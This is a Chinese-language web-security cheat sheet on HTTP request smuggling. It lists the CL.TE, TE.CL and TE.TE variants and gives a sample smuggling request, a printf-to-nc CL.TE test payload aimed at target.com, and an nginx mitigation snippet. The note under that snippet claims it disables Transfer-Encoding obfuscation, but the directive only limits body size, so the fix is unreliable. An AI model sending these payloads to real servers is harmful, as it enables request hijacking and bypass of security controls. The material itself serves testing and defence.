# HTTP 请求走私 (HTTP Request Smuggling)

> **Tier 适用**: L1 ✅

## 一句话风险

利用前后端服务器对请求边界解析的不一致，绕过安全控制或劫持其他用户的请求。

## 一分钟识别清单

- [ ] 应用使用多层代理架构（负载均衡 + Web 服务器）
- [ ] 前后端对 Content-Length 和 Transfer-Encoding 的处理不一致
- [ ] 可在请求中注入额外的 HTTP 头或请求体

## 一句话防御

前后端统一使用相同的请求边界解析规则，禁用不安全的 HTTP 方法。

## 推荐工具链接

- [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler) - Burp 插件
- [Smuggler](https://github.com/defparam/smuggler) - 请求走私检测工具
- [PortSwigger Smuggling](https://portswigger.net/web-security/request-smuggling) - 官方教程

## 常见攻击场景

| 场景 | 描述 |
|------|------|
| CL.TE | 前端用 Content-Length，后端用 Transfer-Encoding |
| TE.CL | 前端用 Transfer-Encoding，后端用 Content-Length |
| TE.TE | 双端都用 TE，但可通过混淆绕过 |
| 请求劫持 | 获取其他用户的敏感信息 |

## 攻击示例

```
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

## 检测方法

```bash
# 使用 Burp 插件自动检测
# 或手动发送多个请求观察响应差异

# CL.TE 检测
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n' | nc target.com 80
```

## 修复建议

```nginx
# Nginx 配置
proxy_http_version 1.1;
proxy_set_header Connection "";

# 禁用 Transfer-Encoding 混淆
client_max_body_size 10m;
```

## 参考

- [PortSwigger HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [HTTP Desync Attacks](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
